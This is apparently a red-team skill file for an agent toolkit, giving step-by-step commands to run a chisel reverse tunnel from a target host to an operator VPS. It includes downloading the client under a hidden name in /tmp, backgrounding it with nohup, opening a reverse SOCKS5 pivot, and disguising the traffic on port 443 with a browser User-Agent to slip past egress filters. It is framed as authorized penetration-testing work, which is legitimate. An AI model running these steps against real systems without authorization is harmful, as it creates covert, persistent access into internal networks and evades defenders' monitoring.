# Chisel HTTP Tunnel: Server and Client Relay

Runs `chisel` as a server on `VPS_IP` and as a client on the target, carrying TCP through an HTTP(S)/WebSocket channel that survives egress filters which allow only web traffic. The client opens reverse tunnels (`R:`) so a SOCKS5 listener appears on this host at `127.0.0.1:LISTEN_PORT`, and individual target-local ports can be mapped back without exposing them on the target network. The path is recorded as a `tunnel` row with `kind=chisel` and `entry_kind=target-outbound`, because the target is the side that dials out.

## When to use

- Egress allows HTTP/HTTPS only, and a SOCKS5 pivot is enough for the tools in play.
- You need a reverse mapping so a service bound to `127.0.0.1:LPORT` on the target becomes reachable here (`R:PORT:127.0.0.1:LPORT`).
- No root on either side: chisel needs no TUN device and no `CAP_NET_ADMIN`.
- The relay must survive reconnects without operator action — the client reconnects automatically and keeps its mappings.
- Not for UDP, ICMP or raw-socket scans; chisel carries TCP streams only, so reach for `ligolo-proxy` when a scan needs SYN or the protocol is not TCP.
- Not for the first foothold on a host that has no execution channel yet; the client must be started by something.

## Prerequisites

- Binary: `bash $DSH_HOME/redteam/setup.sh --yes` installs `$DSH_HOME/redteam/toolkit/chisel/chisel`. Server and client are the same binary, so the copy on `VPS_IP` and the copy on the target must come from the same build. If the script cannot fetch, take `chisel_<version>_linux_amd64.gz` from the project releases, `gunzip` it, `chmod +x`, and stage it on both sides.
- VPS coordinates, optionally from the environment file. Read them with a default so a missing value never blocks the path:

```bash
set -a; . "$DSH_HOME/.env" 2>/dev/null; set +a
VPS_IP="${VPS_IP:-$(printf '%s' "${REDTEAM_VPS_HOST#*@}")}"
VPS_USER="${VPS_USER:-${REDTEAM_VPS_HOST%@*}}"
echo "VPS_IP=$VPS_IP VPS_USER=$VPS_USER"
```

  In Python form the same default is `os.environ.get("VPS_IP", "")`, which keeps the skill usable when nothing is configured.
- `LISTEN_PORT` open on `VPS_IP` (security group plus host firewall), and a target-side port that egress allows — `443` blends best, `8080` is common, an unusual port is fine when the baseline permits it.
- Nothing is mandatory and every step has a fallback. Server port blocked → move to `suo5-tunnel` over the WebShell, which rides the already-allowed web port. No TLS desired → run the server in plain HTTP mode and drop `--tls-*`. No `chisel` binary on the target → the WebShell can carry a base64 blob, or use `frp-tunnel` when an `frpc` build is easier to place.

## Workflow

1. Server side, on `VPS_IP`: start the server inside `tmux` so an SSH drop does not kill the relay. `--reverse` is what allows the target to open `R:` mappings, and `--auth` keeps a port scanner from using the tunnel.

```bash
tmux new -s chisel-srv
$DSH_HOME/redteam/toolkit/chisel/chisel server \
  -p LISTEN_PORT \
  --reverse \
  --auth "OPERATOR:$(openssl rand -hex 12)" \
  --tls-key /etc/ssl/private/chisel.key \
  --tls-cert /etc/ssl/certs/chisel.crt \
  2>&1 | tee RESULT_DIR/chisel-server-LISTEN_PORT.log
```

   Without certificates, `--tls-domain DOMAIN` with a real certificate works too; with neither, the server speaks plain HTTP and the client must use `http://`. Record the printed `server: Fingerprint <hash>` line — the client can pin it.

2. Confirm the listener before touching the target.

```bash
ss -lntp | grep ':LISTEN_PORT\b'
curl -sk --max-time 4 https://VPS_IP:LISTEN_PORT/ -o /dev/null -w '%{http_code}\n'
```

3. Target side: place the binary and run the client with a reverse SOCKS5 mapping. Use the fingerprint from step 1 instead of `--tls-skip-verify` when you have it.

```bash
curl -fsSL -o /tmp/.cs http://VPS_IP:PORT/chisel && chmod +x /tmp/.cs
/tmp/.cs client \
  --auth OPERATOR:LPORT_SECRET \
  --fingerprint <hash> \
  https://VPS_IP:LISTEN_PORT \
  R:socks
```

   `R:socks` binds a SOCKS5 listener on `127.0.0.1:1080` by default. For a different local port use `R:1080:socks`, and to keep the listener on all interfaces (only when another container needs it) `R:0.0.0.0:LISTEN_PORT:socks`.

4. Map one specific target-local service instead of a whole SOCKS proxy, which is quieter and easier to justify in evidence.

```bash
# target -> operator: VPS_IP:PORT now forwards to the target's 127.0.0.1:LPORT
/tmp/.cs client --auth OPERATOR:LPORT_SECRET https://VPS_IP:LISTEN_PORT R:PORT:127.0.0.1:LPORT

# operator -> target: bind LPORT on the target side, reach 127.0.0.1:LISTEN_PORT from here
/tmp/.cs client --auth OPERATOR:LPORT_SECRET https://VPS_IP:LISTEN_PORT L:LPORT:127.0.0.1:PORT
```

5. Background the client so the initial shell can be closed, then verify it is still one process.

```bash
nohup /tmp/.cs client --auth OPERATOR:LPORT_SECRET https://VPS_IP:LISTEN_PORT R:socks \
  >>RESULT_DIR/chisel-client-TARGET_IP.log 2>&1 &
sleep 2; pgrep -af '\.cs client'
```

6. Verify the SOCKS5 endpoint locally, then write the proxychains profile that the rest of the toolchain uses. Never edit `/etc/proxychains4.conf`.

```bash
curl -s --max-time 8 --socks5-hostname 127.0.0.1:1080 http://TARGET_IP:PORT/ | head -20
cat > RESULT_DIR/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF
proxychains4 -f RESULT_DIR/proxychains-1080.conf nmap -sT -Pn -p PORT TARGET_IP
```

7. Behind a corporate HTTP proxy on the target, hand chisel the upstream so the flow looks like ordinary web traffic.

```bash
/tmp/.cs client --proxy http://TARGET_IP:PORT --header "User-Agent: Mozilla/5.0" \
  https://VPS_IP:LISTEN_PORT R:socks
```

8. Reconnect behaviour: the client retries by itself. Only after repeated `connection refused` should you touch the server — check `tmux attach -t chisel-srv` and the server log.

## Output and evidence

- `RESULT_DIR/chisel-server-LISTEN_PORT.log` — server transcript: fingerprint, accepted connections, mapping registrations.
- `RESULT_DIR/chisel-client-TARGET_IP.log` — client transcript: handshake, mapping list, reconnect attempts with timestamps.
- `RESULT_DIR/proxychains-1080.conf` — the per-run proxychains profile referenced by every later internal command.
- `redteam_tunnel_add` with `kind=chisel`, `listen=127.0.0.1:1080`, `entry` = the exact client command, `reach` = the CIDR you actually tested, `entry_kind=target-outbound`. Use `target-http` only when the tunnel rides a WebShell, which is the `suo5-tunnel` case.
- `redteam_evidence_record` with `operation=chisel_tunnel_up`, `authority=tool-output`, `confidence=observed`, and the first successful response body or `nmap -sT` output in `result`.
- `redteam_asset_add` each host that answered through the SOCKS listener, `provenance=active`, `tool=chisel`.
- `redteam_attack_file_add` the client launcher only when it kept working across a reconnect, with `kind=script` and `evidence` naming that reconnect.
- `redteam_session_check` marks the tunnel offline automatically when the client is gone; run it before relying on a stale row.

## Failure modes

- `server: reverse tunnelling disabled` → the server was started without `--reverse` → restart the server with `--reverse`; mappings cannot be created otherwise.
- Client logs `connection refused` then retries forever → wrong port, or the security group drops the SYN → `nc -vz VPS_IP LISTEN_PORT` from the target, and re-check `ss -lntp` on the VPS.
- `x509: certificate signed by unknown authority` → self-signed certificate without `--tls-skip-verify` or `--fingerprint` → add the pin, do not disable verification globally.
- `WebSocket: bad handshake` behind a proxy → the upstream proxy is mangling the upgrade → set the correct `--proxy` value and add a plain `User-Agent` header.
- `bind: address already in use` on the client → `1080` is taken by a previous client or a local proxy → `R:1081:socks` and update the proxychains profile.
- Server log shows `auth failed` → the token contains a character the shell ate, or client and server disagree → quote the token, re-copy it, and use `--auth` on both sides identically.
- SOCKS endpoint answers but internal hosts time out → the target cannot reach them, or the scan is TCP-only and the service is UDP → verify on the target itself with `nc -vz`, and switch to `ligolo-proxy` for UDP.
- Mapping disappears after a few minutes → the client was started in the foreground of a dying shell → restart under `nohup`/`tmux` and re-check `pgrep`.

## Notes

- One client per target host. Two clients against the same server double the mappings and make log analysis ambiguous.
- Rate: all traffic shares one WebSocket stream, so keep `THREADS` low and `RATE` modest; a wide scan saturates the stream and makes every tool slower than scanning in series.
- Opsec: run the server on `443` or on a port the network already uses, pin the fingerprint, and keep the client's default User-Agent only when the baseline shows it. Plain HTTP mode puts the auth token on the wire in clear — prefer TLS.
- Idempotency: `R:` mappings are local to the client process; re-running a command with the same local port fails with `address already in use` rather than replacing. Stop the old pid first.
- Resume: the client reconnects and re-registers mappings automatically; the server keeps working, so no operator action is needed. The server must stay inside `tmux`, otherwise a dropped SSH session ends every relay at once.
- Cleanup: kill the client (`pkill -f '\.cs client'`), remove `/tmp/.cs` and the log, stop the server process, and `redteam_tunnel_update` with `id` and `status=down`. Leave nothing listening on `LISTEN_PORT` — a stray chisel server is a permanent inbound door.
